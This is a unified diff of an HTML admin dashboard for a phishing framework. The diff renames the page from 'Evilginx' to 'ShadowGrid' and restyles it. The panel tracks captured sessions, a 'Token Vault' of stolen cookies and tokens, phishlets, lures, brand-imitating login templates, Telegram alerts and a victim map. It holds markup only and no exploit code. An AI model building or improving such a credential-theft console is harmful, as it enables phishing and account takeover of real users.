@@ -1,713 +1,203 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Evilginx | Admin Dashboard</title>
-    
-    <!-- Fonts -->
+    <title>ShadowGrid | Admin Dashboard</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-    
-    <!-- Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css">
-    
-    <!-- Leaflet -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    
-    <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-    
-    <!-- Styles -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-o9N1j7k36H6Cj6vV+YV8wbPxQY+qJR4i1fQjon9Z8bM=" crossorigin="" />
     <link rel="stylesheet" href="css/modern.css">
     <link rel="icon" href="/img/cookie.png">
 </head>
-<body class="dark">
-    <!-- Background Mesh -->
+<body>
     <div class="bg-gradient-mesh"></div>
-
-    <!-- Toast Container -->
-    <div id="toastContainer" class="toast-container"></div>
-
-    <!-- Main Header -->
-    <header class="main-header">
-        <div class="logo-section">
-            <div class="logo-icon">
-                <i class="ri-shield-keyhole-fill"></i>
-            </div>
-            <span class="logo-text">Evilginx</span>
-        </div>
-        
-        <nav class="nav-section">
-            <button class="nav-btn active" data-tab="dashboard">
-                <i class="ri-dashboard-line"></i>
-                <span>Dashboard</span>
-            </button>
-            <button class="nav-btn" data-tab="sessions">
-                <i class="ri-user-received-line"></i>
-                <span>Sessions</span>
-            </button>
-            <button class="nav-btn" data-tab="tokens">
-                <i class="ri-cookie-line"></i>
-                <span>Tokens</span>
-            </button>
-            <button class="nav-btn" data-tab="map">
-                <i class="ri-map-2-line"></i>
-                <span>Map</span>
-            </button>
-            <button class="nav-btn" data-tab="landing-pages">
-                <i class="ri-pages-line"></i>
-                <span>Landing Pages</span>
-            </button>
-            <button class="nav-btn" data-tab="settings">
-                <i class="ri-settings-3-line"></i>
-                <span>Settings</span>
-            </button>
-        </nav>
-        
-        <div class="header-actions">
-            <button class="icon-btn" id="themeToggle" title="Toggle Theme">
-                <i class="ri-sun-line" id="themeIcon"></i>
-            </button>
-            <button class="icon-btn" id="refreshBtn" title="Refresh Data">
-                <i class="ri-refresh-line"></i>
-            </button>
-            <button class="icon-btn" id="logoutBtn" title="Logout">
-                <i class="ri-logout-box-r-line"></i>
-            </button>
-        </div>
-    </header>
-
-    <!-- Main Content -->
-    <main class="main-content">
-        
-        <!-- Dashboard Tab -->
-        <section id="dashboardTab" class="tab-content active">
-            <!-- Stats Grid -->
-            <div class="stats-grid">
-                <div class="glass-card stat-card success">
-                    <div class="stat-icon">
-                        <i class="ri-user-received-fill"></i>
-                    </div>
-                    <div class="stat-value" id="totalSessions">0</div>
-                    <div class="stat-label">Total Sessions</div>
-                    <div class="stat-trend up">
-                        <i class="ri-arrow-up-line"></i>
-                        <span id="sessionTrend">+0 today</span>
-                    </div>
-                </div>
-                
-                <div class="glass-card stat-card warning">
-                    <div class="stat-icon">
-                        <i class="ri-time-fill"></i>
-                    </div>
-                    <div class="stat-value" id="activeSessions">0</div>
-                    <div class="stat-label">Active Sessions</div>
-                    <div class="stat-trend up">
-                        <i class="ri-pulse-line"></i>
-                        <span>Live</span>
-                    </div>
-                </div>
-                
-                <div class="glass-card stat-card info">
-                    <div class="stat-icon">
-                        <i class="ri-cookie-fill"></i>
-                    </div>
-                    <div class="stat-value" id="totalTokens">0</div>
-                    <div class="stat-label">Tokens Captured</div>
-                    <div class="stat-trend up">
-                        <i class="ri-arrow-up-line"></i>
-                        <span id="tokenTrend">+0 today</span>
-                    </div>
-                </div>
-                
-                <div class="glass-card stat-card danger">
-                    <div class="stat-icon">
-                        <i class="ri-global-fill"></i>
-                    </div>
-                    <div class="stat-value" id="uniqueCountries">0</div>
-                    <div class="stat-label">Countries</div>
-                    <div class="stat-trend down">
-                        <i class="ri-earth-line"></i>
-                        <span>Worldwide</span>
-                    </div>
+    <div class="app-shell">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="brand-icon">SG</div>
+                <div class="brand-copy">
+                    <div class="brand-title">ShadowGrid</div>
+                    <div class="brand-subtitle">Command Center</div>
                 </div>
             </div>
-
-            <!-- Charts Row -->
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 1.5rem; margin-bottom: 1.5rem;">
-                <div class="glass-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-bar-chart-box-line"></i>
-                            <span>Activity Overview</span>
+            <nav class="sidebar-nav">
+                <button class="sidebar-nav-item active" data-tab="dashboard"><i class="ri-dashboard-line"></i><span>Overview</span></button>
+                <button class="sidebar-nav-item" data-tab="sessions"><i class="ri-user-received-line"></i><span>Sessions</span></button>
+                <button class="sidebar-nav-item" data-tab="tokens"><i class="ri-key-2-line"></i><span>Tokens</span></button>
+                <button class="sidebar-nav-item" data-tab="map"><i class="ri-map-pin-2-line"></i><span>Map</span></button>
+                <button class="sidebar-nav-item" data-tab="landing-pages"><i class="ri-pages-line"></i><span>Landing</span></button>
+                <button class="sidebar-nav-item" data-tab="settings"><i class="ri-settings-3-line"></i><span>Settings</span></button>
+            </nav>
+            <div class="sidebar-footer">
+                <button class="sidebar-footer-btn" id="sidebarToggle"><i class="ri-menu-line"></i><span>Compact</span></button>
+                <button class="sidebar-footer-btn" id="themeToggle"><i class="ri-sun-line"></i><span>Theme</span></button>
+                <button class="sidebar-footer-btn" id="refreshBtn"><i class="ri-refresh-line"></i><span>Reload</span></button>
+                <button class="sidebar-footer-btn danger" id="logoutBtn"><i class="ri-logout-box-r-line"></i><span>Logout</span></button>
+            </div>
+        </aside>
+        <main class="main-content">
+            <section id="dashboardTab" class="tab-content active">
+                <div class="page-header">
+                    <div class="page-headline">
+                        <h1>Campaign Intelligence</h1>
+                        <p>Real-time session telemetry, token capture, and active phishlet visibility in a single console.</p>
+                    </div>
+                    <div class="page-actions">
+                        <button class="btn btn-secondary" id="refreshDashboard">Refresh</button>
+                        <button class="btn btn-primary" onclick="switchTab('sessions')">Inspect Sessions</button>
+                    </div>
+                </div>
+                <div class="stats-grid">
+                    <div class="glass-card stat-card">
+                        <div class="stat-icon"><i class="ri-flashlight-line"></i></div>
+                        <div>
+                            <div class="stat-value" id="totalSessions">0</div>
+                            <div class="stat-label">Active Sessions</div>
                         </div>
                     </div>
-                    <div class="card-body">
-                        <canvas id="activityChart" height="250"></canvas>
-                    </div>
-                </div>
-                
-                <div class="glass-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-pie-chart-line"></i>
-                            <span>Phishlet Distribution</span>
+                    <div class="glass-card stat-card">
+                        <div class="stat-icon"><i class="ri-planet-line"></i></div>
+                        <div>
+                            <div class="stat-value" id="uniqueCountries">0</div>
+                            <div class="stat-label">Countries Seen</div>
                         </div>
                     </div>
-                    <div class="card-body">
-                        <canvas id="phishletChart" height="250"></canvas>
+                    <div class="glass-card stat-card">
+                        <div class="stat-icon"><i class="ri-key-2-line"></i></div>
+                        <div>
+                            <div class="stat-value" id="totalTokens">0</div>
+                            <div class="stat-label">Tokens Captured</div>
+                        </div>
+                    </div>
+                    <div class="glass-card stat-card">
+                        <div class="stat-icon"><i class="ri-settings-3-line"></i></div>
+                        <div>
+                            <div class="stat-value" id="activePhishlets">0</div>
+                            <div class="stat-label">Phishlets Enabled</div>
+                        </div>
                     </div>
                 </div>
-            </div>
-
-            <!-- Recent Sessions -->
-            <div class="glass-card">
-                <div class="card-header">
-                    <div class="card-title">
-                        <i class="ri-history-line"></i>
-                        <span>Recent Sessions</span>
+                <div class="glass-card">
+                    <div class="card-header">
+                        <div class="card-title"><i class="ri-bar-chart-line"></i><span>Activity Insight</span></div>
+                        <div class="card-subtitle">Session initiation and token events over the last 24 hours.</div>
                     </div>
-                    <button class="btn btn-primary" onclick="switchTab('sessions')">
-                        <i class="ri-list-view"></i>
-                        <span>View All</span>
-                    </button>
+                    <div class="card-body"><canvas id="activityChart" height="250"></canvas></div>
                 </div>
-                <div class="card-body">
+                <div class="glass-card" style="margin-top: 1.25rem;">
+                    <div class="card-header">
+                        <div class="card-title"><i class="ri-pie-chart-line"></i><span>Phishlet Breakdown</span></div>
+                        <div class="card-subtitle">Distribution of session traffic by enabled phishlet.</div>
+                    </div>
+                    <div class="card-body"><canvas id="phishletChart" height="250"></canvas></div>
+                </div>
+            </section>
+            <section id="sessionsTab" class="tab-content">
+                <div class="page-header">
+                    <div class="page-headline">
+                        <h1>Session Explorer</h1>
+                        <p>Track every authenticated session, inspect captured credentials, and manage sessions from the grid.</p>
+                    </div>
+                </div>
+                <div class="glass-card">
+                    <div class="table-toolbar">
+                        <div class="search-box"><i class="ri-search-line"></i><input type="text" id="sessionSearch" placeholder="Search sessions..."></div>
+                        <div class="toolbar-actions">
+                            <button class="btn btn-secondary" onclick="refreshSessions()"><i class="ri-refresh-line"></i>Reload</button>
+                            <button class="btn btn-primary" onclick="exportAllSessions()"><i class="ri-download-2-line"></i>Export</button>
+                        </div>
+                    </div>
                     <div class="data-table-container">
-                        <table class="data-table" id="recentSessionsTable">
-                            <thead>
-                                <tr>
-                                    <th>ID</th>
-                                    <th>User</th>
-                                    <th>Phishlet</th>
-                                    <th>IP Address</th>
-                                    <th>Status</th>
-                                    <th>Time</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="recentSessionsBody">
-                                <!-- Dynamic content -->
-                            </tbody>
+                        <table class="data-table" id="sessionsTable">
+                            <thead><tr><th>ID</th><th>Target</th><th>Phishlet</th><th>IP</th><th>Status</th><th>Started</th><th>Actions</th></tr></thead><tbody id="sessionsBody"></tbody>
                         </table>
                     </div>
                 </div>
-            </div>
-        </section>
-
-        <!-- Sessions Tab -->
-        <section id="sessionsTab" class="tab-content">
-            <div class="glass-card">
-                <div class="table-toolbar">
-                    <div class="search-box">
-                        <i class="ri-search-line"></i>
-                        <input type="text" id="sessionSearch" placeholder="Search by ID, email, IP...">
+            </section>
+            <section id="tokensTab" class="tab-content">
+                <div class="page-header">
+                    <div class="page-headline"><h1>Token Vault</h1><p>Review captured cookies and access tokens. Export or revoke them directly from the console.</p></div>
+                </div>
+                <div class="glass-card">
+                    <div class="table-toolbar">
+                        <div class="search-box"><i class="ri-search-line"></i><input type="text" id="tokenSearch" placeholder="Search tokens..."></div>
+                        <button class="btn btn-primary" onclick="exportAllCookies()"><i class="ri-download-2-line"></i>Export Cookies</button>
                     </div>
-                    
-                    <div class="toolbar-actions">
-                        <select id="filterPhishlet" class="form-select" style="width: 140px;">
-                            <option value="">All Phishlets</option>
-                        </select>
-                        
-                        <select id="filterStatus" class="form-select" style="width: 120px;">
-                            <option value="">All Status</option>
-                            <option value="active">Active</option>
-                            <option value="completed">Completed</option>
-                            <option value="pending">Pending</option>
-                        </select>
-                        
-                        <input type="date" id="filterDate" class="form-input" style="width: 140px;">
-                        
-                        <button class="btn btn-primary" onclick="refreshSessions()">
-                            <i class="ri-refresh-line"></i>
-                        </button>
-                        
-                        <button class="btn btn-secondary" onclick="exportAllSessions()">
-                            <i class="ri-download-2-line"></i>
-                            <span>Export</span>
-                        </button>
+                    <div class="data-table-container">
+                        <table class="data-table" id="tokensTable">
+                            <thead><tr><th>Domain</th><th>Name</th><th>Value</th><th>Session</th><th>Expires</th><th>HttpOnly</th><th>Secure</th></tr></thead><tbody id="tokensBody"></tbody>
+                        </table>
                     </div>
                 </div>
-                
-                <div class="data-table-container">
-                    <table class="data-table" id="sessionsTable">
-                        <thead>
-                            <tr>
-                                <th><input type="checkbox" id="selectAll"></th>
-                                <th>ID <i class="ri-arrow-down-s-line"></i></th>
-                                <th>User</th>
-                                <th>Phishlet</th>
-                                <th>IP / Location</th>
-                                <th>Tokens</th>
-                                <th>Status</th>
-                                <th>Created</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="sessionsBody">
-                            <!-- Dynamic content -->
-                        </tbody>
-                    </table>
+            </section>
+            <section id="mapTab" class="tab-content">
+                <div class="page-header"><div class="page-headline"><h1>Threat Map</h1><p>Visualize session activity by geo-location with a clustered global map.</p></div></div>
+                <div class="glass-card" style="height: calc(100vh - 220px);"><div id="map" style="height: 100%; border-radius: 22px;"></div></div>
+            </section>
+            <section id="landingPagesTab" class="tab-content">
+                <div class="page-header">
+                    <div class="page-headline"><h1>Landing Pages</h1><p>Manage templates and preview phishing landing pages before assignment.</p></div>
                 </div>
-                
-                <div class="pagination">
-                    <div class="pagination-info">
-                        Showing <span id="pageStart">0</span> to <span id="pageEnd">0</span> of <span id="totalItems">0</span> entries
-                    </div>
-                    <div class="pagination-controls" id="paginationControls">
-                        <!-- Dynamic -->
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Tokens Tab -->
-        <section id="tokensTab" class="tab-content">
-            <div class="glass-card">
-                <div class="table-toolbar">
-                    <div class="search-box">
-                        <i class="ri-search-line"></i>
-                        <input type="text" id="tokenSearch" placeholder="Search tokens...">
-                    </div>
-                    
-                    <div class="toolbar-actions">
-                        <button class="btn btn-secondary" onclick="exportAllCookies()">
-                            <i class="ri-download-2-line"></i>
-                            <span>Export All Cookies</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="data-table-container">
-                    <table class="data-table" id="tokensTable">
-                        <thead>
-                            <tr>
-                                <th>Domain</th>
-                                <th>Name</th>
-                                <th>Value</th>
-                                <th>Session</th>
-                                <th>Expires</th>
-                                <th>HttpOnly</th>
-                                <th>Secure</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tokensBody">
-                            <!-- Dynamic content -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </section>
-
-        <!-- Map Tab -->
-        <section id="mapTab" class="tab-content">
-            <div class="glass-card" style="height: calc(100vh - 180px);">
-                <div class="card-header">
-                    <div class="card-title">
-                        <i class="ri-map-2-line"></i>
-                        <span>Session Map</span>
-                    </div>
-                    <div class="toolbar-actions">
-                        <button class="btn btn-secondary" onclick="resetMap()">
-                            <i class="ri-focus-3-line"></i>
-                            <span>Reset View</span>
-                        </button>
-                    </div>
-                </div>
-                <div class="card-body" style="height: calc(100% - 70px); padding: 0;">
-                    <div id="map" style="height: 100%; border-radius: 0 0 16px 16px;"></div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Landing Pages Tab -->
-        <section id="landingPagesTab" class="tab-content">
-            <div class="glass-card">
-                <div class="card-header">
-                    <div class="card-title">
-                        <i class="ri-pages-line"></i>
-                        <span>Landing Page Templates</span>
-                    </div>
-                    <div class="card-actions">
-                        <button class="btn btn-primary" id="refreshLandingPagesBtn">
-                            <i class="ri-refresh-line"></i>
-                            Refresh
-                        </button>
-                    </div>
-                </div>
-                <div class="card-body">
-                    <p class="text-secondary" style="margin-bottom: 1.5rem;">
-                        Select a landing page template to preview and configure for your lures. Templates support customizable parameters for personalized content.
-                    </p>
-                    
-                    <!-- Category Tabs -->
-                    <div class="landing-categories">
-                        <button class="category-btn active" data-category="all">All</button>
-                        <button class="category-btn" data-category="microsoft">Microsoft</button>
-                        <button class="category-btn" data-category="google">Google</button>
-                        <button class="category-btn" data-category="adobe">Adobe</button>
-                        <button class="category-btn" data-category="storage">Storage</button>
-                        <button class="category-btn" data-category="social">Social</button>
-                        <button class="category-btn" data-category="financial">Financial</button>
-                    </div>
-                    
-                    <!-- Templates Grid -->
-                    <div id="landingPagesGrid" class="landing-pages-grid">
-                        <div class="loading-placeholder">
-                            <i class="ri-loader-4-line spinning"></i>
-                            <span>Loading templates...</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Template Preview Modal -->
-            <div id="templatePreviewModal" class="modal">
-                <div class="modal-content" style="max-width: 900px;">
-                    <div class="modal-header">
-                        <h3 id="previewModalTitle">Template Preview</h3>
-                        <button class="modal-close" id="closePreviewModal">
-                            <i class="ri-close-line"></i>
-                        </button>
-                    </div>
-                    <div class="modal-body">
-                        <div class="preview-container">
-                            <iframe id="templatePreviewFrame" src="" frameborder="0"></iframe>
-                        </div>
-                        <div class="preview-sidebar">
-                            <h4 id="previewTemplateName">Template Name</h4>
-                            <p id="previewTemplateDesc" class="text-secondary">Description</p>
-                            <div id="previewTemplateParams" class="template-params">
-                                <!-- Parameters will be populated here -->
-                            </div>
-                            <div class="preview-actions">
-                                <button class="btn btn-primary" id="useTemplateBtn">
-                                    <i class="ri-check-line"></i>
-                                    Use This Template
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Assign to Lure Modal -->
-            <div id="assignToLureModal" class="modal">
-                <div class="modal-content" style="max-width: 500px;">
-                    <div class="modal-header">
-                        <h3>Assign Landing Page to Lure</h3>
-                        <button class="modal-close" id="closeAssignModal">
-                            <i class="ri-close-line"></i>
-                        </button>
-                    </div>
-                    <div class="modal-body">
-                        <div class="form-group">
-                            <label>Select Lure</label>
-                            <select id="lureSelect" class="form-control">
-                                <option value="">Loading lures...</option>
-                            </select>
-                        </div>
-                        <div id="landingPageParamsForm" class="params-form">
-                            <!-- Dynamic parameters form -->
-                        </div>
-                        <div class="form-actions">
-                            <button class="btn btn-secondary" id="cancelAssignBtn">Cancel</button>
-                            <button class="btn btn-primary" id="confirmAssignBtn">
-                                <i class="ri-check-line"></i>
-                                Assign Landing Page
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Create/Edit Lure Modal -->
-            <div id="createLureModal" class="modal">
-                <div class="modal-content" style="max-width: 600px;">
-                    <div class="modal-header">
-                        <h3 id="createLureModalTitle">Create New Lure</h3>
-                        <button class="modal-close" onclick="closeCreateLureModal()">
-                            <i class="ri-close-line"></i>
-                        </button>
-                    </div>
-                    <div class="modal-body">
-                        <form id="createLureForm">
-                            <input type="hidden" id="editLureIndex" value="">
-                            
-                            <div class="form-group">
-                                <label>Phishlet <span class="required">*</span></label>
-                                <select id="lurePhishlet" class="form-control" required>
-                                    <option value="">Select a phishlet...</option>
-                                </select>
-                                <p class="form-hint">Choose the phishlet for this lure</p>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>Custom Path</label>
-                                <input type="text" id="lurePath" class="form-input" placeholder="/login or leave empty for default">
-                                <p class="form-hint">Optional custom path for the lure URL</p>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>Info/Description</label>
-                                <input type="text" id="lureInfo" class="form-input" placeholder="Description for this lure">
-                            </div>
-                            
-                            <div class="form-divider"></div>
-                            
-                            <div class="form-group">
-                                <label class="toggle-switch">
-                                    <input type="checkbox" id="useExternalRedirect" class="toggle-input" onchange="toggleExternalRedirect()">
-                                    <span class="toggle-slider"></span>
-                                    <span class="toggle-label">Use External Redirect After Sign In</span>
-                                </label>
-                                <p class="form-hint">When enabled, redirect users to a custom URL after successful authentication (MFA/2FA completion)</p>
-                            </div>
-                            
-                            <div class="form-group" id="externalRedirectUrlGroup" style="display: none;">
-                                <label>External Redirect URL <span class="required">*</span></label>
-                                <input type="url" id="externalRedirectUrl" class="form-input" placeholder="https://example.com/success">
-                                <p class="form-hint">Full URL to redirect users after successful sign in (e.g., https://portal.office.com)</p>
-                            </div>
-                            
-                            <div class="form-actions">
-                                <button type="button" class="btn btn-secondary" onclick="closeCreateLureModal()">Cancel</button>
-                                <button type="submit" class="btn btn-primary">
-                                    <i class="ri-save-line"></i>
-                                    <span id="createLureSubmitText">Create Lure</span>
-                                </button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Edit Lure External Redirect Modal -->
-            <div id="editLureRedirectModal" class="modal">
-                <div class="modal-content" style="max-width: 500px;">
-                    <div class="modal-header">
-                        <h3>Edit External Redirect</h3>
-                        <button class="modal-close" onclick="closeEditLureRedirectModal()">
-                            <i class="ri-close-line"></i>
-                        </button>
-                    </div>
-                    <div class="modal-body">
-                        <input type="hidden" id="editRedirectLureIndex" value="">
-                        
-                        <div class="form-group">
-                            <label class="toggle-switch">
-                                <input type="checkbox" id="editUseExternalRedirect" class="toggle-input" onchange="toggleEditExternalRedirect()">
-                                <span class="toggle-slider"></span>
-                                <span class="toggle-label">Use External Redirect After Sign In</span>
-                            </label>
-                        </div>
-                        
-                        <div class="form-group" id="editExternalRedirectUrlGroup" style="display: none;">
-                            <label>External Redirect URL <span class="required">*</span></label>
-                            <input type="url" id="editExternalRedirectUrl" class="form-input" placeholder="https://example.com/success">
-                            <p class="form-hint">URL to redirect users after successful MFA/2FA completion</p>
-                        </div>
-                        
-                        <div class="form-actions">
-                            <button type="button" class="btn btn-secondary" onclick="closeEditLureRedirectModal()">Cancel</button>
-                            <button type="button" class="btn btn-primary" onclick="saveLureExternalRedirect()">
-                                <i class="ri-save-line"></i>
-                                Save Redirect Settings
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Settings Tab -->
-        <section id="settingsTab" class="tab-content">
-            <div style="max-width: 800px; margin: 0 auto;">
-                <!-- Lure Management -->
-                <div class="glass-card" style="margin-bottom: 1.5rem;">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-fishing-line"></i>
-                            <span>Lure Management</span>
-                        </div>
-                        <button class="btn btn-primary" onclick="openCreateLureModal()">
-                            <i class="ri-add-line"></i>
-                            <span>Create Lure</span>
-                        </button>
-                    </div>
-                    <div class="card-body">
-                        <div id="luresList" class="lures-list">
-                            <p class="text-muted">Loading lures...</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Telegram Settings -->
-                <div class="glass-card" style="margin-bottom: 1.5rem;">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-telegram-fill"></i>
-                            <span>Telegram Integration</span>
-                        </div>
-                    </div>
-                    <div class="card-body">
-                        <div class="settings-grid">
-                            <div class="form-group">
-                                <label class="form-label">Bot Token</label>
-                                <input type="password" id="telegramToken" class="form-input" placeholder="Enter bot token...">
-                                <p class="form-hint">Get from @BotFather</p>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">Chat ID</label>
-                                <input type="text" id="telegramChatId" class="form-input" placeholder="Enter chat ID...">
-                                <p class="form-hint">Your Telegram numeric chat ID</p>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="toggle-switch">
-                                    <input type="checkbox" id="telegramEnabled" class="toggle-input">
-                                    <span class="toggle-slider"></span>
-                                    <span class="toggle-label">Enable Notifications</span>
-                                </label>
-                            </div>
-                            
-                            <button class="btn btn-primary btn-full" onclick="saveTelegramSettings()">
-                                <i class="ri-save-line"></i>
-                                <span>Save Telegram Settings</span>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Display Settings -->
-                <div class="glass-card" style="margin-bottom: 1.5rem;">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-palette-line"></i>
-                            <span>Display Settings</span>
-                        </div>
-                    </div>
-                    <div class="card-body">
-                        <div class="settings-grid">
-                            <div class="form-group">
-                                <label class="toggle-switch">
-                                    <input type="checkbox" id="autoRefresh" class="toggle-input" checked>
-                                    <span class="toggle-slider"></span>
-                                    <span class="toggle-label">Auto Refresh (30s)</span>
-                                </label>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="toggle-switch">
-                                    <input type="checkbox" id="notifications" class="toggle-input" checked>
-                                    <span class="toggle-slider"></span>
-                                    <span class="toggle-label">Enable Notifications</span>
-                                </label>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">Items Per Page</label>
-                                <select id="pageSize" class="form-select">
-                                    <option value="10">10</option>
-                                    <option value="25" selected>25</option>
-                                    <option value="50">50</option>
-                                    <option value="100">100</option>
-                                </select>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Password Change -->
                 <div class="glass-card">
                     <div class="card-header">
-                        <div class="card-title">
-                            <i class="ri-lock-password-line"></i>
-                            <span>Change Password</span>
-                        </div>
+                        <div class="card-title"><i class="ri-pages-line"></i><span>Template Catalog</span></div>
+                        <div class="card-subtitle">Select a landing page template and preview the design before assignment.</div>
                     </div>
-                    <div class="card-body">
-                        <div class="settings-grid">
-                            <div class="form-group">
-                                <label class="form-label">Current Password</label>
-                                <input type="password" id="currentPassword" class="form-input" placeholder="Enter current password...">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">New Password</label>
-                                <input type="password" id="newPassword" class="form-input" placeholder="Enter new password...">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">Confirm New Password</label>
-                                <input type="password" id="confirmPassword" class="form-input" placeholder="Confirm new password...">
-                            </div>
-                            
-                            <button class="btn btn-primary btn-full" onclick="changePassword()">
-                                <i class="ri-save-line"></i>
-                                <span>Change Password</span>
-                            </button>
+                    <div class="page-notice">Landing pages are managed through the terminal. Select an active lure first, preview templates in a new browser tab, and assign the best page to the lure.</div>
+                    <div class="landing-toolbar">
+                        <div class="search-box"><i class="ri-search-line"></i><input type="text" id="landingSearch" placeholder="Search templates..."></div>
+                        <div class="selected-lure-status">Selected lure: <strong id="selectedLureLabel">None</strong></div>
+                        <div class="toolbar-actions">
+                            <button class="btn btn-secondary category-btn active" data-category="all">All</button>
+                            <button class="btn btn-secondary category-btn" data-category="microsoft">Microsoft</button>
+                            <button class="btn btn-secondary category-btn" data-category="google">Google</button>
+                            <button class="btn btn-secondary category-btn" data-category="adobe">Adobe</button>
+                            <button class="btn btn-secondary category-btn" data-category="social">Social</button>
+                            <button class="btn btn-primary" id="refreshLandingPagesBtn">Refresh</button>
                         </div>
                     </div>
                 </div>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Session Detail Panel -->
-    <div class="detail-panel-overlay" id="detailOverlay">
-        <div class="detail-panel">
-            <div class="detail-panel-header">
-                <div class="detail-panel-title">
-                    <i class="ri-user-received-line"></i>
-                    <span>Session Details</span>
+                <div class="glass-card" style="margin-top: 1rem;">
+                    <div class="card-header"><div class="card-title"><i class="ri-anchor-line"></i><span>Active Lures</span></div></div>
+                    <div class="page-notice">Click a lure to choose it, then use the template cards below to preview and assign a landing page.</div>
+                    <div class="landing-pages-grid" id="activeLuresGrid"></div>
                 </div>
-                <div style="display: flex; gap: 0.5rem;">
-                    <button class="btn btn-secondary btn-icon" onclick="exportSessionDetail()">
-                        <i class="ri-download-2-line"></i>
-                    </button>
-                    <button class="btn btn-danger btn-icon" onclick="deleteCurrentSession()">
-                        <i class="ri-delete-bin-line"></i>
-                    </button>
-                    <button class="btn btn-secondary btn-icon" onclick="closeDetailPanel()">
-                        <i class="ri-close-line"></i>
-                    </button>
+                <div class="glass-card" style="margin-top: 1rem;">
+                    <div class="card-header"><div class="card-title"><i class="ri-pages-line"></i><span>Template Catalog</span></div><div class="card-subtitle">Select a landing page template and preview the design before assignment.</div></div>
+                    <div class="landing-pages-grid" id="landingPagesGrid"></div>
                 </div>
-            </div>
-            
-            <div class="detail-panel-body" id="detailPanelBody">
-                <!-- Dynamic content -->
-            </div>
-        </div>
+            </section>
+            <section id="settingsTab" class="tab-content">
+                <div class="page-header"><div class="page-headline"><h1>System Settings</h1><p>Configure Telegram, session refresh, and admin controls from one polished panel.</p></div></div>
+                <div class="glass-card">
+                    <div class="card-header"><div class="card-title"><i class="ri-fishing-line"></i><span>Lure Workflow</span></div></div>
+                    <div class="page-notice"><strong>Terminal-only lures:</strong> Create new lures using <code>lures create &lt;phishlet&gt;</code>. Use the list below to choose an active lure after refresh.</div>
+                    <div id="luresList">
+                        <div class="landing-pages-grid">
+                            <div class="landing-page-card" style="grid-template-columns: 1fr;">
+                                <div class="landing-page-card-header"><div class="card-title"><i class="ri-information-line"></i><span>No Lure Data</span></div></div>
+                                <p class="form-hint">Create a lure in the terminal, then click Refresh to load it here.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="glass-card" style="margin-top: 1.25rem;">
+                    <div class="card-header"><div class="card-title"><i class="ri-telegram-fill"></i><span>Telegram Alerts</span></div></div>
+                    <div class="settings-grid">
+                        <div class="form-group"><label class="form-label">Bot Token</label><input type="password" id="telegramToken" class="form-input"></div>
+                        <div class="form-group"><label class="form-label">Chat ID</label><input type="text" id="telegramChatId" class="form-input"></div>
+                        <div class="form-group"><label class="toggle-switch"><input type="checkbox" id="telegramEnabled" class="toggle-input"><span class="toggle-slider"></span><span class="toggle-label">Enable Alerts</span></label></div>
+                    </div>
+                    <button class="btn btn-primary btn-full" onclick="saveTelegramSettings()">Save Telegram Settings</button>
+                </div>
+            </section>
+        </main>
     </div>
-
-    <!-- Bulk Actions Bar -->
-    <div class="bulk-bar" id="bulkBar">
-        <span class="bulk-count"><span id="bulkCount">0</span> selected</span>
-        <div class="bulk-actions-group">
-            <button class="btn btn-success" onclick="exportSelectedSessions()">
-                <i class="ri-download-2-line"></i>
-                <span>Export</span>
-            </button>
-            <button class="btn btn-danger" onclick="deleteSelectedSessions()">
-                <i class="ri-delete-bin-line"></i>
-                <span>Delete</span>
-            </button>
-            <button class="btn btn-secondary" onclick="clearSelection()">
-                <i class="ri-close-line"></i>
-                <span>Clear</span>
-            </button>
-        </div>
-    </div>
-
-    <!-- Scripts -->
